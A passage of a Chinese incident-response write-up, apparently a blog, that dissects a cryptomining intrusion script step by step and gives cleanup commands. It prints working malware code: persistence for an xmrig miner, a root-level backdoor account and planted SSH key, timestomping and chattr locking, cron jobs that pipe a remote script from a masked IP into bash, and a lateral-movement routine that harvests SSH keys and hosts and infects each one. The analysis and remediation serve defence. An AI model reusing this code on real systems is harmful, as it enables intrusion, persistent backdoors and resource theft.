100,/\' $RRHOME/config.json\nsed -i \'s#"log-file": *null,#"log-file": "\'$RRHOME/xmrig.log\'",#\' $RRHOME/config.json\nsed -i \'s/"syslog": *[^,]*,/"syslog": true,/\' $RRHOME/config.json\nsed -i \'s/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/\' $RRHOME/config.json\nsed -i \'s/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/\' $RRHOME/config_background.json\n# 修改配置文件\n\ncp $RRHOME/config.json $RRHOME/config_background.json\nsed -i \'s/"background": *false,/"background": true,/\' $RRHOME/config_background.json\n\n# preparing script\n\necho "[*] Creating $RRHOME/miner.sh script"\ncat >$RRHOME/miner.sh <<EOL\n#!/bin/bash\nif ! pidof xmrig >/dev/null; then\n  nice $RRHOME/xmrig \\$*\nelse\n  echo "RAPTOREUM miner is already running in the background. Refusing to run another one."\n  echo "Run \\"killall xmrig\\" or \\"sudo killall xmrig\\" if you want to remove background miner first."\nfi\nEOL\n\nchmod +x $RRHOME/miner.sh\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br")])]),a("h3",{attrs:{id:"解决-7"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-7"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("p",[s._v("这段代码主要是安装 xmrig和修改配置文件")]),s._v(" "),a("h2",{attrs:{id:"_11-准备脚本后台运行和重启下工作"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_11-准备脚本后台运行和重启下工作"}},[s._v("#")]),s._v(" 11.准备脚本后台运行和重启下工作")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释-2"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('# preparing script background work and work under reboot\n\nif ! sudo -n true 2>/dev/null; then\n  if ! grep miner.sh $RRHOME/.profile >/dev/null; then\n    echo "[*] Adding $RRHOME/miner.sh script to $RRHOME/.profile"\n    echo "$RRHOME/miner.sh --config=$RRHOME/config_background.json >/dev/null 2>&1" >>$RRHOME/.profile\n  else \n    echo "Looks like $RRHOME/miner.sh script is already in the $RRHOME/.profile"\n  fi\n  echo "[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)"\n  /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json >/dev/null 2>&1\nelse\n\n  if [[ $(grep MemTotal /proc/meminfo | awk \'{print $2}\') -gt 3500000 ]]; then\n    echo "[*] Enabling huge pages"\n    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf\n    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))\n  fi\n\n  if ! type systemctl >/dev/null; then\n\n    echo "[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)"\n    /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json >/dev/null 2>&1\n    echo "ERROR: This script requires \\"systemctl\\" systemd utility to work correctly."\n    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."\n\n  else\n\n    echo "[*] Creating rr_miner systemd service"\n    cat >/tmp/xmrig.service <<EOL\n[Unit]\nDescription=RTM miner service\n\n[Service]\nExecStart=$RRHOME/xmrig --config=$RRHOME/config.json\nRestart=always\nNice=10\nCPUWeight=1\n\n[Install]\nWantedBy=multi-user.target\nEOL\n    sudo mv /tmp/xmrig.service /etc/systemd/system/xmrig.service\n    echo "[*] Starting rr_miner systemd service"\n    sudo killall xmrig 2>/dev/null\n    sudo systemctl daemon-reload\n    sudo systemctl enable xmrig.service\n    sudo systemctl start xmrig.service\n    echo "To see miner service logs run \\"sudo journalctl -u rr_miner -f\\" command"\n  fi\nfi\n\necho ""\n\n这段代码用于配置并准备矿工的后台工作，并根据系统环境和条件启动矿工服务。如果可以进行无密码 sudo，脚本会尝试将矿工脚本添加到用户的 .profile 文件中，并在后台运行矿工。如果系统内存足够大，脚本会启用大页面。如果不支持 systemctl，脚本会尝试在后台运行矿工。如果支持 systemctl，脚本会创建并启动 xmrig.service systemd 服务。\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br")])]),a("h3",{attrs:{id:"解决-8"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-8"}},[s._v("#")]),s._v(" 解决：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("rm -rf /etc/systemd/system/xmrig.service\nsystemctl status xmrig.service\nsystemctl disable xmrig.service\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h2",{attrs:{id:"_12-设置ssh登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_12-设置ssh登录"}},[s._v("#")]),s._v(" 12.设置ssh登录")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释-3"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("#setup ssh\n\nRSAKEY=\"ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX wolf@wolfs-MacBook-Pro.local\" # 参数做了处理\n\ngrep -q nobodymm /etc/passwd || chattr -ia /etc/passwd; \ngrep -q nobodymm /etc/passwd || echo 'nobodymm:x:0:0:root:/root:/bin/bash' >> /etc/passwd; chattr +ia /etc/passwd\ngrep -q nobodymm /etc/shadow || chattr -ia /etc/shadow; \ngrep -q nobodymm /etc/shadow || echo 'nobodymm:XXXXXXXXX:19237:0:14600:14:::' >> /etc/shadow; chattr +ia /etc/shadow\ngrep -q nobodymm /etc/sudoers || chattr -ia /etc/sudoers; \ngrep -q nobodymm /etc/sudoers || echo 'nobodymm  ALL=(ALL:ALL) ALL' >> /etc/sudoers; chattr +i /etc/sudoers\n\n这段代码旨在确保名为 nobodymm 的用户存在于系统中，并且在 /etc/passwd、/etc/shadow 和 /etc/sudoers 文件中进行了相应的修改和保护。这可能是一种尝试在系统中添加特定用户并修改权限的脚本片段，但代码片段本身不提供足够的上下文以完全理解其用途。\n\n\nmkdir /run/network/.ssh/ -p  \ntouch /run/network/.ssh/authorized_keys  \nchmod 600 /run/network/.ssh/authorized_keys\ngrep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || chattr -ia /run/network/.ssh/authorized_keys; \ngrep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || echo $RSAKEY > /run/network/.ssh/authorized_keys; chattr +ia /run/network/.ssh/authorized_keys; \nmkdir /root/.ssh/ -p  \ntouch /root/.ssh/authorized_keys  \nchmod 600 /root/.ssh/authorized_keys\ngrep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; \ngrep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys\n\n这段代码旨在将一个特定的 SSH 公钥添加到系统中，以实现免密码登录。它在 /run/network/.ssh/authorized_keys 和 /root/.ssh/authorized_keys 文件中添加该公钥，并将这些文件设置为不可变属性，以防止进一步更改。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br")])]),a("h3",{attrs:{id:"解决方法-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法-2"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chattr -ia /etc/passwd\nchattr -ia /etc/shadow\nchmod 644  /etc/shadow\nchattr -ia /etc/sudoers\n再修改\nvi /etc/passwd\n删除：nobodymm:x:0:0:root:/root:/bin/bash\n\nvi /etc/shadow\n删除： nobodymm:XXXXXXXXX:19237:0:14600:14:::\nchmod 000 /etc/shadow\n\n\nchmod 644  /etc/sudoers\nvi /etc/sudoers\n删除： nobodymm  ALL=(ALL:ALL) ALL\nchmod 440  /etc/sudoers\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("\nrm -rf  /run/network\nchattr -ia /root/.ssh/authorized_keys\nvi /root/.ssh/authorized_keys;\n删除密钥\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"_13-修改-sshd-config-远程登录端口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_13-修改-sshd-config-远程登录端口"}},[s._v("#")]),s._v(" 13.修改 sshd_config 远程登录端口")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释-4"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释-4"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('grep -q 11222 /etc/ssh/sshd_config || echo "Port 22" >> /etc/ssh/sshd_config\ngrep -q 11222 /etc/ssh/sshd_config || echo "Port 11222" >> /etc/ssh/sshd_config\necho "Protocol 2" >> /etc/ssh/sshd_config \necho "ListenAddress 0.0.0.0" >> /etc/ssh/sshd_config \necho "RSAAuthentication yes" >> /etc/ssh/sshd_config \necho "PubkeyAuthentication yes" >> /etc/ssh/sshd_config \necho "AuthorizedKeysFile  .ssh/authorized_keys" >> /etc/ssh/sshd_config \nsudo systemctl restart sshd \ntouch -d 20180409 /etc/ssh/sshd_config \nchattr +ia /etc/ssh/sshd_config \n\n这段代码用于修改 SSH 服务器的配置文件，设置监听端口、协议版本、监听地址、身份验证等选项，并确保配置文件被修改时间锁定以及不可更改。\n\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("h3",{attrs:{id:"解决方法-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法-3"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chattr -ia /etc/ssh/sshd_config\nvi /etc/ssh/sshd_config \n删除新增的字段\nPort 22\nPort 11222\nProtocol 2\nListenAddress 0.0.0.0\nRSAAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile  .ssh/authorized_keys\n都是删掉保存\nsystemctl restart sshd \n\n已经在最开始的时候操作了\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("h2",{attrs:{id:"_14-修改定时任务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_14-修改定时任务"}},[s._v("#")]),s._v(" 14.修改定时任务")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释-5"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释-5"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('chattr -R -ia /var/spool/cron \nchattr -ia /etc/crontab \nchattr -R -ia /etc/cron.d \nchattr -R -ia /var/spool/cron/crontabs \ncrontab -r\nrm -rf /var/spool/cron/*\nrm -rf /etc/cron.d/*\nrm -rf /var/spool/cron/crontabs\nrm -rf /etc/crontab\n\ncrontab -l 2>/dev/null\necho "*/30 * * * * root curl -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash " >> /etc/crontab\necho "*/30 * * * * root cd1 -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash " >> /etc/crontab\necho crontab created\ntouch -d 20180515 /etc/crontab\n\nchattr -R +ia /var/spool/cron\nchattr +ia /etc/crontab\nchattr -R +ia /var/spool/cron/crontabs\nchattr -R +ia /etc/cron.d\n\ntouch -d 20151212 /etc/.system\n\n这段代码旨在修改和设置定时任务的配置以及相关文件的属性\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br")])]),a("h3",{attrs:{id:"解决方法-4"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法-4"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chattr -ia /var/spool/cron\nchattr -ia /etc/crontab\n\nvi /etc/crontab\nrm -rf   /etc/crontab~\nrm -rf /etc/crontaz~\nsystemctl restart crond\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"_15-获取局域网ip-并且感染对应"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_15-获取局域网ip-并且感染对应"}},[s._v("#")]),s._v(" 15.获取局域网IP，并且感染对应")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释-6"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释-6"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("localgo() {\n    KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)\n    # KEYS：使用 find 命令搜索用户目录下的 id_rsa 私钥文件，排除 .pub 后缀的公钥文件。\n    \n    KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F \"IdentityFile\" '{print $2 }')\n    # KEYS2：从 SSH 配置文件中提取 IdentityFile 的路径。\n\n    KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)\n    #KEYS3：使用 find 命令搜索用户目录下的 .pem 文件。\n\n\n    HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F \"HostName\" '{print $2}')\n    #HOSTS：从 SSH 配置文件中提取 HostName。\n\n    HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E \"(ssh|scp)\" | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")\n    #HOSTS2：从用户的命令历史中提取出使用 SSH 或 SCP 连接过的 IP 地址。\n\n\n    HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | uniq)\n    # HOSTS3：从已知主机的 SSH 密钥文件中提取出 IP 地址。\n\n    USERZ=$(\n        echo \"root\"\n        find ~/ /root /home -maxdepth 2 -name '\\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v \"\\.ssh\"\n        # USERZ：从目录结构中提取用户列表，排除 .ssh 目录。\n    )\n    userlist=$(echo $USERZ | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\n    \n    hostlist=$(echo \"$HOSTS $HOSTS2 $HOSTS3\" | grep -vw 127.0.0.1 | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\n    keylist=$(echo \"$KEYS $KEYS2 $KEYS3\" | tr ' ' '\\n' | nl | sort -u -k2 | sort -n | cut -f2-)\n    \n    # userlist、hostlist、keylist：整理和排序上述提取出的用户、主机和密钥列表。\n    \n    for user in $userlist; do\n        for host in $hostlist; do\n            for key in $keylist; do\n                chmod +r $key; chmod 400 $key\n                ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i $key $user@$host \"(curl -fsSL  http://XX.XX.XX.XX/php/php_8020.sh||cd1 -fsSL  http://XX.XX.XX.XX/php/php_8020.sh) | bash\"\n            done\n        done\n    done\n\n}\n\nif [ ! -f \"/var/tmp/.alsp\" ];\nthen\n  localgo\n  echo 'lockfile' > /var/tmp/.alsp\n  chattr +i /var/tmp/.alsp\nelse\n  echo \"replay .. i know this server ...\"\n  exit\nfi\n\n\necho \"[*] Setup compXlete\"\ncurl 